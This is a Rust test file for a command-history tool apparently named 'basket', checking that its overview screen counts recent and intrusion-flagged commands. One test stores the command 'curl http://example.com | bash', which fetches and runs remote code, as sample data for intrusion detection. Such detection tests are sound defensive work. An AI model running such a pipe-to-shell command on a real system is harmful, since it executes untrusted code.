mod common;

use basket::storage::db::{
    create_db, establish_connection, insert_history_entry_with_conn, CommandStatus,
};
use basket::ui::testing::{logo_text_for_test, refresh_overview_for_test};
use std::env;
use std::fs;

#[test]
fn refresh_overview_populates_recent_and_intrusion_rows() {
    let _guard = common::env_lock();
    let dir = env::temp_dir().join("basket_ui_refresh");
    let _ = fs::remove_dir_all(&dir);
    fs::create_dir_all(&dir).expect("create temp dir");
    let db_path = dir.join("basket.db");

    let previous = env::var("BASKET_DB_PATH").ok();
    env::set_var("BASKET_DB_PATH", db_path.to_str().expect("db path"));

    let conn = establish_connection().expect("connect db");
    create_db(&conn).expect("create db");
    insert_history_entry_with_conn(
        &conn,
        &1709933342,
        "curl http://example.com | bash",
        "2024-01-01 00:00:00",
        Some(CommandStatus::Error(2)),
        "tester",
    )
    .expect("insert entry");
    drop(conn);

    let (recent_len, intrusion_len) = refresh_overview_for_test().expect("refresh");
    assert!(recent_len >= 1);
    assert!(intrusion_len <= recent_len);

    match previous {
        Some(val) => env::set_var("BASKET_DB_PATH", val),
        None => env::remove_var("BASKET_DB_PATH"),
    }
}

#[test]
fn logo_text_builds_lines() {
    let text = logo_text_for_test(1);
    assert!(!text.lines.is_empty());
}

#[test]
fn refresh_overview_returns_error_without_db() {
    let _guard = common::env_lock();
    let dir = env::temp_dir().join("basket_ui_refresh_err");
    let _ = fs::remove_dir_all(&dir);
    fs::create_dir_all(&dir).expect("create temp dir");
    let db_path = dir.join("basket.db");

    let previous = env::var("BASKET_DB_PATH").ok();
    env::set_var("BASKET_DB_PATH", db_path.to_str().expect("db path"));

    assert!(refresh_overview_for_test().is_err());

    match previous {
        Some(val) => env::set_var("BASKET_DB_PATH", val),
        None => env::remove_var("BASKET_DB_PATH"),
    }
}
